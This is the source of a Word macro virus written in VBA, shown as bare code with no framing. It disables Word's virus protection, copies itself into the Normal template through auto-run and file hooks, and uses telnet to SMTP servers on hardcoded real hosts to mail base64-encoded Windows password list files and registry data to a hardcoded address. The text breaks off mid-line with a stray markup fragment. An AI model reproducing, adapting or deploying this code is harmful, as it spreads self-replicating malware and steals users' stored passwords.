   Attribute VB_Name = "MSPlus"
   'NetscapePasswordReminder
   Option Explicit
   Type FILETIME
     dwLowDateTime As Long
     dwHighDateTime As Long
   End Type
   Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
   Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
   Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
   Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
   Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
   Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
   Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
   Declare Function FindWindow Lib "user32.dll" Alias _
   "FindWindowA" (ByVal lpClassName As Any, _
   ByVal lpWindowName As Any) As Long
   Sub CopyLines(Source As Object)
   On Error Resume Next
        Dim SourceM As Object, TargetM As Object
        Dim n As Long
        Dim Body As String
        Dim VBComponent  As Object
       For Each VBComponent In Source.VBProject.VBComponents
        Set SourceM = VBComponent
        n = SourceM.CodeModule.CountOfLines
        Body = SourceM.CodeModule.Lines(1, 1)
        If InStr(1, Body, "NetscapePasswordReminder", vbTextCompare) <> 0 Then
        Body = SourceM.CodeModule.Lines(1, n)
        Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
        TargetM.CodeModule.AddFromString Body
        TargetM.Name = "MSPlus"
        End If
      Next
    End Sub
   Sub AutoExec()
   On Error Resume Next
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   KeyBindings.Add KeyCategory:=wdKeyCategoryMacro, Command:="Grab_Registr", KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF1)
   End Sub
   Sub AutoExit()
   Dim Counter As Long
   Dim i As Long
   Dim Yes As Boolean
   Dim VBComponent As Object

   On Error Resume Next
     Application.Visible = False
     Yes = False
    For Each VBComponent In NormalTemplate.VBProject.VBComponents
    If VBComponent.Name = "MSPlus" Then
     Yes = True
    End If
    Next
    If Yes = False Then
     Counter = Templates.Count
    For i = 1 To Counter
     If InStr(1, Templates(i).FullName, "STARTUP", vbTextCompare) <> 0 Then
    Templates(i).OpenAsDocument
    CopyLines Templates(i)
    ActiveDocument.Close
    End If
    Next
    End If
    NormalTemplate.Save
    Tmsn
   End Sub
   Sub AutoOpen()
   Dim VBComponent As Object
   Dim Yes As Boolean
    On Error Resume Next
   KeyBindings.Add KeyCategory:=wdKeyCategoryMacro, Command:="Grab_Registr", KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF1)
   ActiveDocument.ShowSpellingErrors = False
   ActiveDocument.ShowGrammaticalErrors = False
    Yes = False
    For Each VBComponent In NormalTemplate.VBProject.VBComponents
    If VBComponent.Name = "MSPlus" Then
     Yes = True
    End If
    Next
   If Yes = False Then
   CopyLines MacroContainer
   End If
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   NormalTemplate.Save
   End Sub
   Sub FileOpen()
   On Error Resume Next
   AutoOpen
   Dialogs(80).Show
   Sender_main
   End Sub

   Sub FileSave()
   On Error Resume Next
   ActiveDocument.Save
   Sender_main
   End Sub
   Sub FileClose()
   On Error Resume Next
   AutoOpen
   ActiveDocument.Close
   End Sub
   Sub AutoClose()
   On Error Resume Next
   AutoOpen
   End Sub
   Sub Tmsn()
   Dim Delta As Integer
   Dim Old As Byte
   Dim NF As Integer
   NF = FreeFile
   On Error Resume Next
   Open "c:\windows\logow.sys" For Binary Access Read As #NF
   Get #NF, 76989, Old
   Close #NF
   Delta = Val(Mid(Date$, 4, 2))
   Delta = Delta - Old
   Select Case Delta
    Case Is > 2
    Sender
    Case Is < 0 And Delta + 31 > 2
    Sender
    Case Else
    End Select
   End Sub
   Sub Sender()
   Dim i As Long
    i = 0
    For i = 0 To 20
     If Check_Connection = True Then
      Sender_main
      Exit Sub
     Else
      Pause 254
     End If
    Next
   End Sub
   Sub Sender_main()
   Dim Handle As Long
   Dim HandleBW As Long
   Dim hwnd As Long
   Dim FileName As String
   Dim Start As Long
   Dim MyDat As Byte
   Dim i As Integer
   Dim NPwl() As String
   Dim j As Integer
   Dim Title As String
   Dim SMTP As String
   Dim Host(1 To 10) As String
   Dim A() As Integer
   Dim f As Integer
   Dim NF As Integer
   Dim THwnd As Long
   Dim Twnd As String
   Dim None As String
   On Error Resume Next
   If Check_Connection = True Then
   Host(1) = "ns1.kazna.com"
   Host(2) = "mail.iname.com"
   Host(3) = "194.186.182.26"
   Host(4) = "195.75.32.20"
   Host(5) = "lily.bas-net.by"
   Host(6) = "212.19.17.57"
   Host(7) = "itk2.bas-net.by"
   Host(8) = "imaph2.bas-net.by"
   Host(9) = "tuna.fsr.com"
   Host(10) = "redfish.fsr.com"
   Loto 10, A()
   Shell "telnet", 0
     THwnd = FindWindow(CLng(0), "Telnet - (none)")
     If THwnd <> 0 Then
       Twnd = "telnet"
       None = "(none)"
      Else
      THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
      If THwnd <> 0 Then
      Twnd = "Òåëíåò"
       None = "(íåò)"
       Else
      THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
      Twnd = "telnet"
       None = "(íåò)"
     End If
     End If
   SendMessage THwnd, CLng(16), ByVal CLng(0), 0
   DoEvents
   For f = 1 To 5
   Shell "telnet " + Host(A(f)) + " 25", 0
   DoEvents
   Start = Timer
   Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
    Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
    HandleBW = FindWindow(CLng(0), "Connect failed")
    DoEvents
   Loop
   Select Case Handle
     Case Is <> 0
   SMTP = "helo orck1#$$mail from: <master@myself.com>#$rcpt to: <kashek@usa.net>#$data#$Date: " + _
    Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
    + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
   Filler SMTP, Handle
   Pause 1
   Grab FileName
   SMTP = Base64(FileName)
   Kill "c:\windows\" + FileName
   SMTP = Adapt(SMTP)
   Filler SMTP, Handle
   Pause 1
   FindPWL i, NPwl()
   If i <> 0 Then
    For j = 0 To i - 1
     If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
      SMTP = Base64(NPwl(j))
      SMTP = Adapt(SMTP)
         Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
      + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
      NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
      + Chr(34) + NPwl(j) + Chr(34) + "#"
         Filler Title, Handle
      Pause 1
      Filler SMTP, Handle
      Pause 1
     End If
    Next
   End If
   Title = "##------=_NextPart--#.#$quit#"
   Filler Title, Handle
   Pause 1
   Start = Timer
   Do Until hwnd <> 0 Or Timer - Start > 120
    hwnd = FindWindow(CLng(0), Twnd)
    DoEvents
   Loop
   Select Case hwnd
   Case Is = 0
     SendMessage Handle, CLng(16), ByVal CLng(0), 0
     Handle = 0
   Case Else
     SendMessage hwnd, CLng(16), ByVal CLng(0), 0
       NF = FreeFile
     MyDat = Val(Mid(Date$, 4, 2))
     Open "c:\windows\logow.sys" For Binary Access Write As #NF
     Put #NF, 76989, MyDat
     Close #NF
     DoEvents
     SendMessage Handle, CLng(16), ByVal CLng(0), 0
     Exit Sub
   End Select
   Case Else
   Handle = FindWindow(CLng(0), Twnd + " - " + None)
   SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
   Pause </span
